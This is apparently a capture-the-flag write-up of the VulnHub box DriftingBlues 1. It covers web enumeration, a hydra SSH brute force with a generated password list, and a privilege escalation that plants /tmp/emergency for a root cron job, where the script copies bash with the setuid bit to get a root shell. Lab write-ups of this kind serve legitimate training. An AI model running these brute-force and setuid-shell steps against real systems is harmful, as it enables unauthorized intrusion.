# BOX NAME: DriftingBlues 1
**LINK**: https://www.vulnhub.com/entry/driftingblues-1,625/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate web until you find indications of a password.
2. Brute-force SSH.
3. Local enumeration until you stumble upon a cron-job running a backup-script with a hidden backdoor.
4. Exploit the backdoor et voila.

The box itself was not a hard box. Pretty fun with for me not seen before ciphers.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.48
[+] URL:	http://driftingblues.box
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-db1.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:35 CEST
Nmap scan report for 10.77.0.48
Host is up (0.00024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cae6d11f27f26298efbfe438b5f16777 (RSA)
|   256 a8589999f681c4c2b4da44da9bf3b89b (ECDSA)
|_  256 395b552a79edc3bff516fdbd61292ab7 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Drifting Blues Tech
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-db1.log
http://10.77.0.48 [200 OK] Apache[2.4.18]
 Bootstrap
 Country[RESERVED][ZZ]
 Email[eric@driftingblues.box, sheryl@driftingblues.box]
 HTML5
 HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]
 IP[10.77.0.48]
 JQuery
 Script
 Title[Drifting Blues Tech]
 X-UA-Compatible[ie=edge]
```

nikto-scan

```
└─$ nikto -h $IP | tee nikto-db1.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.48
+ Target Hostname:    10.77.0.48
+ Target Port:        80
+ Start Time:         2023-04-26 15:35:53 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 1e1e, size: 5b63056704628, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-04-26 15:36:18 (GMT2) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing

```
/secret.html
/gallery
/css
/js
/noteforkingfish.txt | (Gives and Ook Ook! cipher)

base64 string in html-source. | L25vdGVmb3JraW5nZmlzaC50eHQ=
```
```
└─$ hURL -b 'L25vdGVmb3JraW5nZmlzaC50eHQ='

Original string       :: L25vdGVmb3JraW5nZmlzaC50eHQ=
base64 DEcoded string :: /noteforkingfish.txt
```
```
└─$ ffuf -u $URL -w /base/wordlists/subdomains/shubs-subdomains.txt -H "Host: FUZZ.driftingblues.box" -fs 7710

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://driftingblues.box
 :: Wordlist         : FUZZ: /base/wordlists/subdomains/shubs-subdomains.txt
 :: Header           : Host: FUZZ.driftingblues.box
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 7710
________________________________________________

test                    [Status: 200, Size: 24, Words: 1, Lines: 6, Duration: 0ms]
```
```
test.driftingblues.box/robots.txt

User-agent: *
Disallow: /ssh_cred.txt
Allow: /never
Allow: /never/gonna
Allow: /never/gonna/give
Allow: /never/gonna/give/up
```
other

```
└─$ ./egrabber.py $URL
-----------------------------------------------------------------
Emails found on this page:       http://10.77.0.48
-----------------------------------------------------------------
sheryl@driftingblues.box
eric@driftingblues.box
-----------------------------------------------------------------
Usernames found on this page:    http://10.77.0.48
-----------------------------------------------------------------
sheryl
eric


:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
Emails saved in:         emails.txt
Usernames saved in:      usernames.txt
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
```
```
└─$ python3 -c 'for i in range(0,100,1): print("1mw4ckyyucky"+str(i))' > passwords.txt

└─$ hydra -L usernames.txt -P passwords.txt $IP ssh -t 8
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 17:18:00
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 200 login tries (l:2/p:100), ~25 tries per task
[DATA] attacking ssh://10.77.0.48:22/
[22][ssh] host: 10.77.0.48   login: eric   password: 1mw4ckyyucky#
```

</details>
<details><summary><ins>OTHER</ins></summary>

SSH (Port 22)
```
[+] 
```

DNS (Port 53)
```
[+] 
```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
[+]
```

**SUID's**:

```
/bin/su
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
```
**SGID's**:

```
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/xorg/Xorg.wrap
/usr/lib/evolution/camel-lock-helper-1.2
/usr/bin/mlocate
/usr/bin/bsd-write
/usr/bin/wall
/usr/bin/expiry
/usr/bin/crontab
/usr/bin/ssh-agent
/usr/bin/chage
```
**OTHERS**:

```
eric@driftingblues:/var/backups$ cat /var/backups/backup.sh 
#!/bin/bash

/usr/bin/zip -r -0 /tmp/backup.zip /var/www/
/bin/chmod

#having a backdoor would be nice
sudo /tmp/emergency

```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6f072e70e3e49380ff4d43cdde8178c24cf73daa, stripped
 

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.7 LTS
Release:        16.04
Codename:       xenial


Linux driftingblues 4.15.0-123-generic #126~16.04.1-Ubuntu SMP Wed Oct 21 13:48:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
sheryl:
eric:1mw4ckyyucky6      [SSH]

```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
MD4:
MD5:
SHA1:
SHA512:
```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
eric@driftingblues:/tmp$ echo '#!/bin/bash
> cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > emergency
eric@driftingblues:/tmp$ chmod +x emergency 
eric@driftingblues:/tmp$ cat emergency 
#!/bin/bash
cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
eric@driftingblues:/tmp$ ./rootbash -p
rootbash-4.3# id
uid=1001(eric) gid=1001(eric) euid=0(root) egid=0(root) groups=0(root),1001(eric)
```
```
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
```
```
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
thank you for playing
```
</details>